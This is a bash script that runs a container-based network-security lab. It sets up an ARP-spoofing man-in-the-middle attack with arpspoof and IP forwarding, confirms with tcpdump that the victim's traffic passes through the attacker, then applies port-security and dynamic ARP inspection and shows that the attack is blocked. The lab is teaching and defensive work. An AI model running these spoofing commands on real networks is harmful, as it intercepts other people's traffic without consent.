#!/usr/bin/env bash
# validate.sh
# Drives the Module 2 lab. Five subcommands:
#
#   ./validate.sh check     -- topology is up and traffic flows normally
#   ./validate.sh attack    -- run ARP spoofing from attacker; verify it worked
#   ./validate.sh defend    -- apply port-security; re-run attack; verify it failed
#   ./validate.sh cleanup   -- reset state without destroying the topology
#   ./validate.sh all       -- check, then attack, then defend (the full lab in one shot)
#
# Exit code 0 = pass, non-zero = fail. Designed to be safe to re-run.

set -uo pipefail

SWITCH=clab-cleartext-l2-switch
GATEWAY=clab-cleartext-l2-gateway
VICTIM=clab-cleartext-l2-victim
BYSTANDER=clab-cleartext-l2-bystander
ATTACKER=clab-cleartext-l2-attacker

GATEWAY_IP=10.0.0.1
VICTIM_IP=10.0.0.10
BYSTANDER_IP=10.0.0.11
ATTACKER_IP=10.0.0.99

LAB_DIR="$(cd "$(dirname "$0")" && pwd)"
CONFIGS_DIR="$LAB_DIR/configs"

# ---------- output helpers ----------

if [ -t 1 ]; then
    C_INFO=$'\033[36m'; C_PASS=$'\033[32m'; C_FAIL=$'\033[31m'; C_OFF=$'\033[0m'
else
    C_INFO=""; C_PASS=""; C_FAIL=""; C_OFF=""
fi

info() { echo "${C_INFO}[*]${C_OFF} $*"; }
pass() { echo "${C_PASS}[PASS]${C_OFF} $*"; }
fail() { echo "${C_FAIL}[FAIL]${C_OFF} $*"; }

# ---------- container helpers ----------

dexec() { docker exec "$@"; }

container_running() {
    [ "$(docker inspect -f '{{.State.Running}}' "$1" 2>/dev/null)" = "true" ]
}

require_topology() {
    local missing=0
    for c in $SWITCH $GATEWAY $VICTIM $BYSTANDER $ATTACKER; do
        if ! container_running "$c"; then
            fail "Container $c is not running. Did you run 'sudo containerlab deploy'?"
            missing=1
        fi
    done
    [ $missing -eq 0 ] || exit 1
}

own_mac() {
    dexec "$1" cat /sys/class/net/eth1/address
}

mac_for_ip() {
    # Look up the MAC the given container has cached for the given IP.
    dexec "$1" ip neigh show "$2" | awk '{print $5}'
}

# ---------- subcommand: check ----------

cmd_check() {
    require_topology

    info "All containers are running."

    info "Pinging gateway from victim..."
    if dexec "$VICTIM" ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null 2>&1; then
        pass "Topology healthy. Victim reaches gateway."
    else
        fail "Victim cannot reach gateway. Topology is broken."
        exit 1
    fi
}

# ---------- subcommand: attack ----------

cmd_attack() {
    require_topology

    info "Forcing victim to resolve the gateway (so its ARP cache is populated)..."
    dexec "$VICTIM" ping -c 1 -W 1 "$GATEWAY_IP" >/dev/null 2>&1 || true
    sleep 1

    local real_gw_mac attacker_mac before
    real_gw_mac=$(own_mac "$GATEWAY")
    attacker_mac=$(own_mac "$ATTACKER")
    before=$(mac_for_ip "$VICTIM" "$GATEWAY_IP")

    info "Real gateway MAC:                          $real_gw_mac"
    info "Attacker MAC:                              $attacker_mac"
    info "Victim's cached gateway MAC (before attack): $before"

    info "Enabling IP forwarding on attacker (so victim still has connectivity)..."
    dexec "$ATTACKER" sysctl -w net.ipv4.ip_forward=1 >/dev/null

    info "Starting arpspoof in both directions on attacker..."
    dexec -d "$ATTACKER" sh -c "arpspoof -i eth1 -t $VICTIM_IP $GATEWAY_IP >/dev/null 2>&1"
    dexec -d "$ATTACKER" sh -c "arpspoof -i eth1 -t $GATEWAY_IP $VICTIM_IP >/dev/null 2>&1"

    info "Waiting 5 seconds for ARP cache to be poisoned..."
    sleep 5

    # Force the victim to refresh its ARP entry by sending traffic
    dexec "$VICTIM" ping -c 1 -W 1 "$GATEWAY_IP" >/dev/null 2>&1 || true
    sleep 1

    local after
    after=$(mac_for_ip "$VICTIM" "$GATEWAY_IP")
    info "Victim's cached gateway MAC (after attack):  $after"

    info "Confirming victim traffic now flows through the attacker..."
    # Generate traffic, capture one matching frame on attacker's interface
    (dexec "$VICTIM" ping -c 5 -W 1 "$GATEWAY_IP" >/dev/null 2>&1 &)
    local saw_traffic=0
    if dexec "$ATTACKER" timeout 3 tcpdump -i eth1 -c 1 -n \
        "src host $VICTIM_IP and dst host $GATEWAY_IP and icmp" \
        >/dev/null 2>&1; then
        saw_traffic=1
    fi

    echo
    if [ "$after" = "$attacker_mac" ] && [ "$saw_traffic" -eq 1 ]; then
        pass "ARP spoofing attack succeeded. Attacker is in the middle."
        echo
        echo "    What just happened:"
        echo "    - Attacker sent forged ARP packets claiming to be both the"
        echo "      gateway (to the victim) and the victim (to the gateway)."
        echo "    - Victim's kernel believed them and updated its ARP cache."
        echo "    - Victim's traffic to the gateway is now physically being"
        echo "      delivered to the attacker, who forwards it on."
        echo
        echo "    Try this manually to see it live:"
        echo "      docker exec -it $ATTACKER tcpdump -i eth1 -n host $VICTIM_IP"
        echo "      docker exec -it $VICTIM ip neigh show $GATEWAY_IP"
        echo
        return 0
    else
        fail "Attack did not succeed."
        echo "    Expected victim's gateway MAC = $attacker_mac, got $after"
        echo "    Captured victim->gateway packets on attacker: $saw_traffic"
        return 1
    fi
}

# ---------- subcommand: defend ----------

cmd_defend() {
    require_topology

    info "Stopping any previous arpspoof processes..."
    dexec "$ATTACKER" pkill -f arpspoof 2>/dev/null || true
    sleep 1

    info "Clearing ARP caches on victim and gateway (let them re-learn cleanly)..."
    dexec "$VICTIM"  ip -s -s neigh flush all >/dev/null
    dexec "$GATEWAY" ip -s -s neigh flush all >/dev/null

    info "Recording each device's expected MAC and IP..."
    cat > "$CONFIGS_DIR/macs.env" <<EOF
GATEWAY_IP=$GATEWAY_IP
GATEWAY_MAC=$(own_mac "$GATEWAY")
VICTIM_IP=$VICTIM_IP
VICTIM_MAC=$(own_mac "$VICTIM")
BYSTANDER_IP=$BYSTANDER_IP
BYSTANDER_MAC=$(own_mac "$BYSTANDER")
ATTACKER_IP=$ATTACKER_IP
ATTACKER_MAC=$(own_mac "$ATTACKER")
EOF

    info "Applying port-security and DAI on the switch..."
    dexec "$SWITCH" sh /configs/switch-secure.sh

    info "Re-running ARP spoofing attack against a hardened switch..."
    dexec "$ATTACKER" sysctl -w net.ipv4.ip_forward=1 >/dev/null
    dexec -d "$ATTACKER" sh -c "arpspoof -i eth1 -t $VICTIM_IP $GATEWAY_IP >/dev/null 2>&1"
    dexec -d "$ATTACKER" sh -c "arpspoof -i eth1 -t $GATEWAY_IP $VICTIM_IP >/dev/null 2>&1"

    info "Waiting 5 seconds..."
    sleep 5

    # Force the victim to use its cache
    dexec "$VICTIM" ping -c 1 -W 1 "$GATEWAY_IP" >/dev/null 2>&1 || true
    sleep 1

    local real_gw_mac after
    real_gw_mac=$(own_mac "$GATEWAY")
    after=$(mac_for_ip "$VICTIM" "$GATEWAY_IP")
    info "Real gateway MAC:                          $real_gw_mac"
    info "Victim's cached gateway MAC (after attack): $after"

    info "Confirming no victim traffic reaches the attacker..."
    (dexec "$VICTIM" ping -c 5 -W 1 "$GATEWAY_IP" >/dev/null 2>&1 &)
    local saw_traffic=0
    if dexec "$ATTACKER" timeout 3 tcpdump -i eth1 -c 1 -n \
        "src host $VICTIM_IP and dst host $GATEWAY_IP and icmp" \
        >/dev/null 2>&1; then
        saw_traffic=1
    fi

    # Stop the attack processes whether or not they did anything
    dexec "$ATTACKER" pkill -f arpspoof 2>/dev/null || true

    echo
    if [ "$after" = "$real_gw_mac" ] && [ "$saw_traffic" -eq 0 ]; then
        pass "Port-security and DAI blocked the attack. Switch dropped the spoofed frames."
        echo
        echo "    What just happened:"
        echo "    - Attacker sent the same forged ARP packets as before."
        echo "    - Switch's DAI rule for eth4 (attacker's port) saw an ARP"
        echo "      packet whose ARP-sender-IP was the gateway (10.0.0.1) but"
        echo "      arriving on a port allocated to 10.0.0.99. It dropped the"
        echo "      frame before it ever reached the victim."
        echo "    - Victim's ARP cache stayed correct. No man-in-the-middle."
        echo
        echo "    Try this manually to confirm:"
        echo "      docker exec $SWITCH ebtables -L FORWARD --Lc"
        echo
        return 0
    else
        fail "Defense did not hold."
        echo "    Expected victim's gateway MAC = $real_gw_mac, got $after"
        echo "    Captured victim->gateway packets on attacker: $saw_traffic"
        return 1
    fi
}

# ---------- subcommand: cleanup ----------

cmd_cleanup() {
    require_topology

    info "Killing any arpspoof processes on attacker..."
    dexec "$ATTACKER" pkill -f arpspoof 2>/dev/null || true

    info "Flushing ebtables rules on switch..."
    dexec "$SWITCH" ebtables -F FORWARD 2>/dev/null || true

    info "Clearing ARP caches..."
    dexec "$VICTIM"    ip -s -s neigh flush all >/dev/null 2>&1 || true
    dexec "$GATEWAY"   ip -s -s neigh flush all >/dev/null 2>&1 || true
    dexec "$BYSTANDER" ip -s -s neigh flush all >/dev/null 2>&1 || true

    info "Done. Topology is back to its initial post-deploy state."
}

# ---------- subcommand: all ----------

cmd_all() {
    cmd_check  || exit 1
    echo
    cmd_attack || exit 1
    echo
    cmd_defend || exit 1
    echo
    pass "Full lab completed end-to-end."
}

# ---------- dispatch ----------

case "${1:-help}" in
    check)   cmd_check ;;
    attack)  cmd_attack ;;
    defend)  cmd_defend ;;
    cleanup) cmd_cleanup ;;
    all)     cmd_all ;;
    *)
        cat <<EOF
Usage: $0 {check|attack|defend|cleanup|all}

  check    Verify the topology came up correctly and traffic flows normally.
  attack   Run ARP spoofing from the attacker. Pass = attacker is now in the middle.
  defend   Apply port-security + DAI on the switch. Re-run attack. Pass = attack blocked.
  cleanup  Stop attacks, clear rules, reset ARP caches. Topology stays up.
  all      Run check, then attack, then defend, in sequence.
EOF
        exit 1
        ;;
esac
